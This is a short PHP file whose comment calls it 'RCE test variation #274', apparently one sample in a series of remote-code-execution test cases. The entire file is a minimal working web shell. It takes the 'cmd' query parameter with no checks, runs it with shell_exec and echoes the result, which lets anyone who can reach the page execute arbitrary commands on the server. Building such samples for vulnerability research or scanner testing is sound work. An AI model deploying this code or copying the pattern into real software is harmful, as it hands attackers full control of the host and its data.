<?php
// RCE test variation #274
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>